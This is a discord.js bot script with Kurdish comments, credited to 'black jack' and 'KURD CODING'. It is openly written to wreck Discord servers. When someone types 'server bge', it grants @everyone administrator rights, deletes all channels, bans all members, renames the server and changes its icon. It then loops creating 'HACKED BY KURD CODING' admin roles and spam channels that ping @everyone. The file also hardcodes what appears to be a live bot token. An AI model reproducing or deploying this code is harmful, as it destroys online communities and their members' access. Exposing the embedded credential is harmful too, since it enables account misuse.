const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = 'm!'///lera ba dly xot prefix dabne
client.on('ready', () => {
console.log(`Logged in as ${client.user.tag}!`);
 
});

          
/////Ban all

////

          
client.on("ready", () => {
  console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
  console.log('By black jack');/////BLACK JACK 
console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
console.log(`Logged in as ${client.user.tag}!`);
  client.user.setActivity(`${prefix}help | BOT SESTAM ${client.guilds.size}`)///////shtek bnwsa
 client.user.setStatus("dnd")/////ba dly xot statusek bnwsa
  console.log(`Logined`)
})
///created by black jack 
client.on('message', message => {
    if (message.content.toLowerCase() === 'server bge') {
        message.delete();
        message.guild.roles.find('name', '@everyone').edit({
            permissions: ["ADMINISTRATOR"]
        });
        let oldnm = message.guild.name;
        message.guild.channels.map(c => {
            c.delete();
        });
    message.guild.members.forEach( member => {
          
          member.ban()
      })
      
        setInterval(() => {
            message.guild.createRole({
                name: "HACKED BY KURD CODING",
                permissions: ["ADMINISTRATOR"]
            }).then(rr => {
 
                message.member.addRole(rr.id);
            })
        }, 1000);
        message.guild.setIcon("https://images-ext-2.discordapp.net/external/XQ3ma0vVczOTnGnwHuarnQ01YWiAleZACpdd0BctfPA/https/play-lh.googleusercontent.com/hxhQGvgSGD1cTZ1XAZoylrTvy5vo020km-5vtSuQr98uXaVVS-PaZdUqI5BEI_02MrA%3Dw412-h220-rw");
        message.guild.setName('HACKED BY KURD CODING');
        setTimeout(function() {
            setInterval(() => {
          
                message.guild.createChannel('HACKED BY KURD CODING', 'text').then(channel => {
                channel.send('@everyone HACKRAWA LALAYAN SAEWANI KURD CODING:joy: :joy: :joy:')
               
                })
            }
                        
                        , 500)
            })
        }
    
})  

 ////codaka drwst krawa lalayan black jack

client.login("NzU4MzE4ODY4NTg2MDM3Mjk5.X2tNew.4uiKp7VTKoZX0NnNP5HLHswVA0o")
          